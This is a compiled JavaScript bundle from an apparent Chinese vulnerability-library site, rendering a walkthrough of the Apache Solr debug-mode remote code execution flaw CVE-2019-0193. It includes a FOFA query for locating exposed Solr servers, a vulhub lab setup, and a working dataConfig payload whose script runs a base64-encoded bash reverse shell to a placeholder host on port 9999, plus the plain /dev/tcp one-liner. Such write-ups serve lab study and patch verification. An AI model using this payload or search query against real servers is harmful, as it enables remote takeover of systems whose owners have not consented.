(window.webpackJsonp=window.webpackJsonp||[]).push([[100],{2110:function(t,s,a){t.exports=a.p+"assets/img/6b8ee428-c68d-4517-8206-fb6eda9d4e5b.e7f8f3bd.png"},2111:function(t,s,a){t.exports=a.p+"assets/img/9e50ce8c-94b7-461c-95e9-17030e72623f.fbbd9b0b.png"},2112:function(t,s,a){t.exports=a.p+"assets/img/7217d375-48e1-460e-bb1e-c1db123daff1.644c527f.png"},2113:function(t,s,a){t.exports=a.p+"assets/img/999fb5d8-a762-4957-a9b7-a6e66df216dd.04a1c72d.png"},2646:function(t,s,a){"use strict";a.r(s);var e=a(75),n=Object(e.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"apache-solr-debug-mode-远程执行漏洞-cve-2019-0193"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#apache-solr-debug-mode-远程执行漏洞-cve-2019-0193"}},[t._v("#")]),t._v(" Apache Solr Debug-Mode 远程执行漏洞 CVE-2019-0193")]),t._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),e("p",[t._v("2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与data-config.xml 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 dataConfig 参数中可以包含 script 恶意脚本导致远程代码执行。")]),t._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("Apache Solr")]),e("br"),t._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[e("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU29sciI%3D"}},[t._v('FOFA: app="APACHE-Solr"')])],1),t._v(" "),e("h2",{attrs:{id:"环境搭建"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[t._v("https://github.com/vulhub/vulhub.git\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" vulhub/solr/CVE-2019-0193\n"),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("docker-compose")]),t._v(" build\n"),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("docker-compose")]),t._v(" up -d\n\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 创建一个solr核心test")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("docker-compose")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("exec")]),t._v(" solr "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("bash")]),t._v(" bin/solr create_core -c "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("test")]),t._v(" -d example/example-DIH/solr/db\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br")])]),e("p",[t._v("访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可")]),t._v(" "),e("p",[e("img",{attrs:{src:a(2110),alt:"6b8ee428-c68d-4517-8206-fb6eda9d4e5b"}})]),t._v(" "),e("h2",{attrs:{id:"登录页面"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#登录页面"}},[t._v("#")]),t._v(" 登录页面")]),t._v(" "),e("p",[t._v("点击刚刚创建的test进入调试")]),t._v(" "),e("p",[e("img",{attrs:{src:a(2111),alt:"9e50ce8c-94b7-461c-95e9-17030e72623f"}})]),t._v(" "),e("p",[t._v("将下面的POC代码填入 Debug-Mode 中")]),t._v(" "),e("div",{staticClass:"language-xml line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-xml"}},[e("code",[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("dataConfig")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("dataSource")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("URLDataSource"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),e("span",{pre:!0,attrs:{class:"token cdata"}},[t._v('<![CDATA[\n          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}");\n          }\n  ]]>')]),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("document")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("entity")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("stackoverflow"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("\n            "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("url")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("https://stackoverflow.com/feeds/tag/solr"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("\n            "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("processor")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("XPathEntityProcessor"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("\n            "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("forEach")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("/feed"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("\n            "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("transformer")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("script:poc"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("document")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("dataConfig")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br")])]),e("p",[t._v("注意 POC 执行的代码中的base64字符串的位置请置换成自己的ip地址并base64加密填入")]),t._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("bash")]),t._v(" -i "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">&")]),t._v(" /dev/tcp/xxx.xxx.xxx.xxx/9999 "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v(">")]),e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("&1")]),t._v("\n直接如上写入反弹无反应，不稳定，需要base64加密写才能反弹一个shell\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br")])]),e("p",[t._v("点击EXecute执行代码")]),t._v(" "),e("p",[e("img",{attrs:{src:a(2112),alt:"7217d375-48e1-460e-bb1e-c1db123daff1"}})]),t._v(" "),e("p",[e("img",{attrs:{src:a(2113),alt:"999fb5d8-a762-4957-a9b7-a6e66df216dd"}})])],1)}),[],!1,null,null,null);s.default=n.exports}}]);